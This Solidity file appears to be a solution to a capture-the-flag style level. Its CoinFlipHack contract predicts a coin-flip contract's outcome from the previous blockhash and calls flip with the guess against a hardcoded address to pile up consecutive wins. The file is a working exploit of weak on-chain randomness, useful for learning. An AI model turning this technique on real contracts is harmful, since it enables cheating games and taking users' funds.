pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
  }
}

contract CoinFlipHack {

    uint256 public blockVal;
    address payable cf_addr;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool public coinFlipVal = false;
    uint256 TO_WIN = 10;

    uint256 public wins = 0;

    CoinFlip public cf = CoinFlip(0x8cC35479F60fd3ce2fF69B72027AFE0fa7b3A2FF);

    function goWin() public {

        // tried using a for loop but was not successful
        
        blockVal = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockVal / FACTOR;
        coinFlipVal = coinFlip == 1 ? true : false;

        bool success = cf.flip(coinFlipVal);

    }

    function getConsecutiveWins() public {

        wins = cf.consecutiveWins();

    }
}